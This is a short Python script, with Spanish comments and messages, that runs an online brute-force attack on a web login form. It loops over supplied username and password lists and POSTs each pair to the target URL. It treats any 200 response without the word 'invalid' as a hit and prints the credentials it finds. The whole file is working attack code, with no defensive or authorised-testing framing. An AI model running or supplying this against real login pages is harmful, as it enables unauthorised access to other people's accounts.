import requests

def brute_force_login(url, usernames, passwords, username_field="username", password_field="password"):
    print(f"\n[+] Iniciando fuerza bruta contra: {url}\n")

    found = False

    for user in usernames:
        for pwd in passwords:
            data = {
                username_field: user,
                password_field: pwd
            }

            try:
                response = requests.post(url, data=data, timeout=10)

                # Detectar inicio de sesión exitoso (ajustar esto según el sistema)
                if "invalid" not in response.text.lower() and response.status_code == 200:
                    print(f"   ✔ Credenciales válidas encontradas: {user}:{pwd}")
                    found = True
                    return user, pwd
                else:
                    print(f"   ✘ Falló: {user}:{pwd}")

            except Exception as e:
                print(f"   [!] Error con {user}:{pwd} → {e}")

    if not found:
        print("   ✘ No se encontraron credenciales válidas.")
    return None, None
